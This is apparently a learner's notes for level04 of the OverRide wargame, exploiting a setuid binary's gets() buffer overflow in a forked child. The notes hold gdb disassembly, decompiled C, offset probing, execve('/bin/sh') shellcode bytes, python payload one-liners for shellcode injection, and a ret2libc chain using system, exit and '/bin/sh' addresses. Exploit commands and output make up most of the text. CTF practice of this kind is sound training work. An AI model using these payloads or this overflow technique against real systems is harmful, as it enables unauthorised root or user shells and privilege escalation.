level04@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04


level04@OverRide:~$ ./level04 
Give me some shellcode, k
k
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k

child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
child is exiting...


```
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```


(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0804845c  _init
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt
0x08048510  __gmon_start__
0x08048510  __gmon_start__@plt
0x08048520  kill
0x08048520  kill@plt
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
0x08048540  prctl
0x08048540  prctl@plt
0x08048550  fork
0x08048550  fork@plt
0x08048560  __isoc99_scanf
0x08048560  __isoc99_scanf@plt
0x08048570  ptrace
0x08048570  ptrace@plt
0x08048580  _start
0x080485b0  __do_global_dtors_aux
0x08048610  frame_dummy
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
0x08048830  __libc_csu_init
0x080488a0  __libc_csu_fini
0x080488a2  __i686.get_pc_thunk.bx
0x080488b0  __do_global_ctors_aux
0x080488dc  _fini


(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   %ebp
   0x080486c9 <+1>:	mov    %esp,%ebp
   0x080486cb <+3>:	push   %edi
   0x080486cc <+4>:	push   %ebx
   0x080486cd <+5>:	and    $0xfffffff0,%esp
   0x080486d0 <+8>:	sub    $0xb0,%esp
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   0x080486e2 <+26>:	lea    0x20(%esp),%ebx
   0x080486e6 <+30>:	mov    $0x0,%eax
   0x080486eb <+35>:	mov    $0x20,%edx
   0x080486f0 <+40>:	mov    %ebx,%edi
   0x080486f2 <+42>:	mov    %edx,%ecx
   0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	movl   $0x1,0x4(%esp)
   0x0804871b <+83>:	movl   $0x1,(%esp)
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	movl   $0x0,0xc(%esp)
   0x0804872f <+103>:	movl   $0x0,0x8(%esp)
   0x08048737 <+111>:	movl   $0x0,0x4(%esp)
   0x0804873f <+119>:	movl   $0x0,(%esp)
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	movl   $0x8048903,(%esp)
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    0x20(%esp),%eax
   0x0804875b <+147>:	mov    %eax,(%esp)
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    0x1c(%esp),%eax
   0x0804876d <+165>:	mov    %eax,(%esp)
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    0x1c(%esp),%eax
   0x08048779 <+177>:	mov    %eax,0xa0(%esp)
   0x08048780 <+184>:	mov    0xa0(%esp),%eax
   0x08048787 <+191>:	and    $0x7f,%eax
   0x0804878a <+194>:	test   %eax,%eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    0x1c(%esp),%eax
   0x08048792 <+202>:	mov    %eax,0xa4(%esp)
   0x08048799 <+209>:	mov    0xa4(%esp),%eax
   0x080487a0 <+216>:	and    $0x7f,%eax
   0x080487a3 <+219>:	add    $0x1,%eax
   0x080487a6 <+222>:	sar    %al
   0x080487a8 <+224>:	test   %al,%al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	movl   $0x804891d,(%esp)
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:	movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:	mov    0xac(%esp),%eax
   0x080487d1 <+265>:	mov    %eax,0x4(%esp)
   0x080487d5 <+269>:	movl   $0x3,(%esp)
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:	cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	movl   $0x8048931,(%esp)
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	movl   $0x9,0x4(%esp)
   0x0804880a <+322>:	mov    0xac(%esp),%eax
   0x08048811 <+329>:	mov    %eax,(%esp)
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    $0x0,%eax
   0x0804881f <+343>:	lea    -0x8(%ebp),%esp
   0x08048822 <+346>:	pop    %ebx
   0x08048823 <+347>:	pop    %edi
   0x08048824 <+348>:	pop    %ebp
   0x08048825 <+349>:	ret    
End of assembler dump.


(gdb) disas enable_timeout_cons 
Dump of assembler code for function enable_timeout_cons:
   0x080486a0 <+0>:	push   %ebp
   0x080486a1 <+1>:	mov    %esp,%ebp
   0x080486a3 <+3>:	sub    $0x18,%esp
   0x080486a6 <+6>:	movl   $0x804868f,0x4(%esp)
   0x080486ae <+14>:	movl   $0xe,(%esp)
   0x080486b5 <+21>:	call   0x80484d0 <signal@plt>
   0x080486ba <+26>:	movl   $0x3c,(%esp)
   0x080486c1 <+33>:	call   0x80484e0 <alarm@plt>
   0x080486c6 <+38>:	leave  
   0x080486c7 <+39>:	ret    
End of assembler dump.


(gdb) disas prog_timeout 
Dump of assembler code for function prog_timeout:
   0x0804868f <+0>:	push   %ebp
   0x08048690 <+1>:	mov    %esp,%ebp
   0x08048692 <+3>:	mov    $0x1,%eax
   0x08048697 <+8>:	mov    $0x1,%ebx
   0x0804869c <+13>:	int    $0x80
   0x0804869e <+15>:	pop    %ebp
   0x0804869f <+16>:	ret    
End of assembler dump.


(gdb) disas get_unum 
Dump of assembler code for function get_unum:
   0x08048657 <+0>:	push   %ebp
   0x08048658 <+1>:	mov    %esp,%ebp
   0x0804865a <+3>:	sub    $0x28,%esp
   0x0804865d <+6>:	movl   $0x0,-0xc(%ebp)
   0x08048664 <+13>:	mov    0x804a040,%eax
   0x08048669 <+18>:	mov    %eax,(%esp)
   0x0804866c <+21>:	call   0x80484a0 <fflush@plt>
   0x08048671 <+26>:	mov    $0x8048900,%eax
   0x08048676 <+31>:	lea    -0xc(%ebp),%edx
   0x08048679 <+34>:	mov    %edx,0x4(%esp)
   0x0804867d <+38>:	mov    %eax,(%esp)
   0x08048680 <+41>:	call   0x8048560 <__isoc99_scanf@plt>
   0x08048685 <+46>:	call   0x8048634 <clear_stdin>
   0x0804868a <+51>:	mov    -0xc(%ebp),%eax
   0x0804868d <+54>:	leave  
   0x0804868e <+55>:	ret    
End of assembler dump.


(gdb) disas clear_stdin 
Dump of assembler code for function clear_stdin:
   0x08048634 <+0>:	push   %ebp
   0x08048635 <+1>:	mov    %esp,%ebp
   0x08048637 <+3>:	sub    $0x18,%esp
   0x0804863a <+6>:	movb   $0x0,-0x9(%ebp)
   0x0804863e <+10>:	jmp    0x8048641 <clear_stdin+13>
   0x08048640 <+12>:	nop
   0x08048641 <+13>:	call   0x80484c0 <getchar@plt>
   0x08048646 <+18>:	mov    %al,-0x9(%ebp)
   0x08048649 <+21>:	cmpb   $0xa,-0x9(%ebp)
   0x0804864d <+25>:	je     0x8048655 <clear_stdin+33>
   0x0804864f <+27>:	cmpb   $0xff,-0x9(%ebp)
   0x08048653 <+31>:	jne    0x8048640 <clear_stdin+12>
   0x08048655 <+33>:	leave  
   0x08048656 <+34>:	ret    
End of assembler dump.





undefined4 main(void)

{
  int iVar1;
  char *pcVar2;
  byte bVar3;
  uint local_a4;
  char local_a0 [128];
  uint local_20;
  uint local_1c;
  long local_18;
  int local_14;
  
  bVar3 = 0;
  local_14 = fork();
  pcVar2 = local_a0;
  for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
    pcVar2[0] = '\0';
    pcVar2[1] = '\0';
    pcVar2[2] = '\0';
    pcVar2[3] = '\0';
    pcVar2 = pcVar2 + ((uint)bVar3 * -2 + 1) * 4;
  }
  local_18 = 0;
  local_a4 = 0;
  if (local_14 == 0) {
    prctl(1,1);
    ptrace(PTRACE_TRACEME,0,0,0);
    puts("Give me some shellcode, k");
    gets(local_a0);
  }
  else {
    do {
      wait(&local_a4);
      local_20 = local_a4;
      if (((local_a4 & 0x7f) == 0) ||
         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
        puts("child is exiting...");
        return 0;
      }
      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
    } while (local_18 != 0xb);
    puts("no exec() for you");
    kill(local_14,9);
  }
  return 0;
}


void enable_timeout_cons(void)

{
  signal(0xe,prog_timeout);
  alarm(0x3c);
  return;
}



void prog_timeout(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0x80);
  (*pcVar1)();
  return;
}


undefined4 get_unum(void)

{
  undefined4 local_10 [3];
  
  local_10[0] = 0;
  fflush(stdout);
  __isoc99_scanf(&DAT_08048900,local_10);
  clear_stdin();
  return local_10[0];
}



void clear_stdin(void)

{
  int iVar1;
  
  do {
    iVar1 = getchar();
    if ((char)iVar1 == '\n') {
      return;
    }
  } while ((char)iVar1 != -1);
  return;
}






(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
child is exiting...
[Inferior 1 (process 1835) exited normally]
(gdb) r
Starting program: /home/users/level04/level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Give me some shellcode, k
again ?

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cxzcxz
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()


level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Give me some shellcode, k
^C
level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
sadsad
dsadsad
dsad
sadsad
^C
level04@OverRide:~$







(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1894]
Give me some shellcode, k
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1894]
0x4e4e4e4e in ?? ()

4e -> N

aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN

[padding] + [address]
└───┬───┘ + └───┬───┘
	156	  +		4		= 160


```
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```
size : 21


[shellcode] + [padding] + [address]
└────┬────┘ + └───┬───┘ + └───┬───┘
	21		+	 135	+	  4		= 160



find address to shellcode 
```
    gets(local_a0);
```

local_a0



(gdb) b *0x0804875e
Breakpoint 2 at 0x804875e
(gdb) r
Starting program: /home/users/level04/level04 
Give me some shellcode, k
c
child is exiting...
[Inferior 1 (process 1908) exited normally]
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1911]
Give me some shellcode, k
[Switching to process 1911]

Breakpoint 2, 0x0804875e in main ()
(gdb) p $eax
$1 = -10624
(gdb) p eax
No symbol table is loaded.  Use the "file" command.
(gdb) p $esp-20x
Invalid number "20x".
(gdb) p $esp-0x20
$2 = (void *) 0xffffd640
(gdb) p $esp+0x20
$3 = (void *) 0xffffd680
(gdb) n $eax
(gdb) x $eax
0xffffd680:	0x00000000


local_a0 <-> 0xffffd680


0xffffd680
\x80\xd6\xff\xff



python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 135 + '\x80\xd6\xff\xff'"

\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\xd6\xff\xff


____________________

(gdb) set follow-fork-mode child
(gdb) b *0x08048763
(gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level04/level04 <<< $(python -c 'print "a" * 156 + "BBBB"')
[New process 1911]
Give me some shellcode, k
[Switching to process 1911]

Breakpoint 1, 0x08048763 in main ()

(gdb) x/50x $esp
0xffffd5e0:	0xffffd600	0x00000000	0x00000000	0x00000000
0xffffd5f0:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
0xffffd600:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd610:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd620:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd630:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd640:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd650:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd660:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd670:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd680:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd690:	0x61616161	0x61616161	0x61616161	0x42424242
0xffffd6a0:	0x00000000	0xffffd734


0xffffd640
\x40\xd6\xff\xff

python -c 'print "\x90" * 135 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x40\xd6\xff\xff"'



___________________________________________



No current process: you must name one.
(gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
Starting program: /home/users/level04/level04 <<< $(python -c 'print "a" * 156 + "BBBB"')
[New process 1949]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1949]
0x42424242 in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 1949
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fda000     0x2000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000 "/bin/sh"
A syntax error in expression, near `"/bin/sh"'.
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.


0xf7e6aed0

0xf7f897ec



python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1]'

python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'

python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'




								(apres EIP = saved EIP)
			  [saved EIP]	 + [ESP = ret adr]+ [ESP+4 = arg 1]
[padding] + [address system] + [address exit] + [arg system]
└───┬───┘ + └───────┬──────┘ + └──────┬─────┘ + └─────┬────┘
   160	  +			4		 +		  4		  +		  4			  		











